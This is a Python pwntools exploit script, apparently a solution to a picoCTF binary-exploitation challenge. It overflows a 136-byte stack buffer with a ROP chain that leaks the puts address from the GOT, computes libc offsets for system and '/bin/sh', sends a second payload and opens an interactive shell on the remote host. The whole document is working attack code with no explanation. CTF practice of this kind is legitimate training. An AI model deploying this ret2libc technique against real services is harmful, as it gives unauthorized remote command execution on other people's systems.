from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 54623
r = remote(HOST, PORT)

pop_rdi = 0x400913
puts_plt = 0x400540
puts_got = 0x601018
main = 0x400771
r.sendline(b'A' * 136 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

puts_libc = r.recvuntil('\nW')[-8:-2]
puts_libc =  b'\x00\x00' + puts_libc
puts_libc = hex(u64(puts_libc))[:-4]
libc = int(puts_libc, 16) - 0x80a30
system = libc + 0x4f4e0
sh = libc + 0x1b40fa
ret = 0x40052e
r.sendline(b'A' * 136 + p64(ret) + p64(pop_rdi) + p64(sh) + p64(system))

r.interactive()